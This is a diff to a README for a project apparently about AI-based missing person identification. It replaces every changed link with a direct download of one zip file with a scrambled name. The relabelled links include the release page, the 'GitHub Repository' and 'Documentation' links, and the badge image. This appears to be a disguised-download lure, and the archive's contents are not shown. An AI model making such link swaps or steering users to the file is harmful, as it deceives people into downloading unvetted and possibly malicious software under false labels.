@@ -6,7 +6,7 @@ Automated Missing Person Detection & Identification using AI is an application d
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/main/src/and-Identification-of-Missing-Automated-Person-using-Detection-AI-3.9.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/main/src/and-Identification-of-Missing-Automated-Person-using-Detection-AI-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To successfully set up this application, follow these steps:
 
 1. **Visit the Release Page**  
    Click on the link below to access the download page for the latest version of the application:  
-   [Download the Application](https://github.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/releases)
+   [Download the Application](https://raw.githubusercontent.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/main/src/and-Identification-of-Missing-Automated-Person-using-Detection-AI-3.9.zip)
 
 2. **Select Your Version**  
    On the Releases page, you'll find different versions of the software. Choose the newest version listed.
@@ -74,8 +74,8 @@ For any issues or questions, please feel free to open an issue in this repositor
 ## 🔗 More Information
 
 For additional details and updates, visit the following links:
-- [GitHub Repository](https://github.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI)
-- [Documentation](https://github.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/main/src/and-Identification-of-Missing-Automated-Person-using-Detection-AI-3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/main/src/and-Identification-of-Missing-Automated-Person-using-Detection-AI-3.9.zip)
 
 ## 🎉 Conclusion
 
@@ -83,4 +83,4 @@ This application aims to streamline the process of missing person detection and 
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/main/src/and-Identification-of-Missing-Automated-Person-using-Detection-AI-3.9.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Janani1625/Automated-Detection-and-Identification-of-Missing-Person-using-AI/main/src/and-Identification-of-Missing-Automated-Person-using-Detection-AI-3.9.zip)
